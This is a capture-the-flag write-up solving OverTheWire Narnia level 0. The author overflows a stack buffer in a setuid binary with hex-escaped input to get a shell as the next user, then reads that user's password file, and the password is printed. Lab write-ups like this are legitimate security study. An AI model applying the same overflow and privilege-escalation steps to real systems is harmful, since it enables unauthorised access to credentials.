# Krypton
These are my solutions to the [narnia ctf](https://overthewire.org/wargames/narnia/). Since these are solutions, there are obviously spoilers. Additionally, my solutions may be rather terse.

## Level 0 to Level 1
We are told to log in with the following info:

```bash
# password narnia0
ssh narnia0@narnia.labs.overthewire.org -p 2226
```

and that data can be found in `/narnia/`. Inside `/narnia/` we see a binary file named `narnia0` as well as some C source code in `narnia0.c`. One thing to notice is that `narni0` is a `setuid` binary file that will run with the permissions of the `narnia1` user (which we verify by looking at the following):

```bash
narnia0@narnia:/narnia$ ls -hartl narnia0
-r-sr-x--- 1 narnia1 narnia0 7.3K Aug 26  2019 narnia0
```

The `s` character tells us the binary executes with the permissions of the owner, who happenst to be `narnia`.

Looking at the source code, we see that there is a `char buf[20]` allocated that is used to take input from us when we execute the binary. 20 characters seems a bit much for this exercise, so it seems likely that we're supposed to try and overflow this buffer to achieve our desired goals. If we look further down into the sourcecode, we see

```c
if(val==0xdeadbeef){
    setreuid(geteuid(),geteuid());
    system("/bin/sh");
}
```

so, somehow, we need to make `val` equal to `0xdeadbeef` and then we can get access to the shell.

Additionally, the line `scanf("%24s",&buf);` limits our input to 24 characters. Another suspicious "mistake."

One thing we can notice if we mess around with various inputs of ~24 characters, is the following (I removed some extraneous output):

```bash
narnia0@narnia:/narnia$ echo -e "AAAAAAAAAAAAAAAAAAAAdead" | ./narnia0
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAdead
val: 0x64616564
narnia0@narnia:/narnia$ echo -e "AAAAAAAAAAAAAAAAAAAAdeaf" | ./narnia0
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAdeaf
val: 0x66616564
```

We can probably bruteforce the solution. One of the problems is that we're reallllly far off from 0xdeadbeef, too far for alphabetic characters to probably make a difference. So, we'd probably need some pretty nasty ASCII characters to get us to where we want. I did some googling and found that it is possible to input hex digits into bash by using an `\x` escape sequence. So let's try the following:

```bash
narnia0@narnia:/narnia$ echo -e "AAAAAAAAAAAAAAAAAAAA\xde\xad" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
val: 0x4100adde
```

Well... that definitely got us closer! I forgot that the memory is stacked "backwards", so what we really wanted is the following:

```bash
narnia0@narnia:/narnia$ echo -e "AAAAAAAAAAAAAAAAAAAA\xad\xde" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA��
val: 0x4100dead
WAY OFF!!!!
```

Continuing in this way, we get...

```bash
narnia0@narnia:/narnia$ echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

Woohoo! We got the value matching... although now nothing happens. The shell in the program exits before we can do anything. Luckily, we can inject a command after our echo so which will run some other code for us. We know (from doing the other overthewire challenges) that the passwords are stored in `/etc/narnia_pass/`, so let's just `cat` the `/etc/narnia_pass/narnia1` file.

```bash
narnia0@narnia:/narnia$ (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat; ) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

For some reason, I can't use the `cat /etc/narnia_pass/narnia1` command directly in the command group. If I just leave `cat` it leaves the iostream open and allows us to retain access to the shell until we close it.

password: `efeidiedae`

### Things I learned from this lesson:
- Command Groups
- Bash hex escape sequence `\x`

### Things I need to learn better from this lesson:
- Memory stuff (stack frames. [this solution](https://hackmethod.com/overthewire-narnia-0/?v=7516fd43adaa) goes into pretty good detail)

## Level 1 to Level 2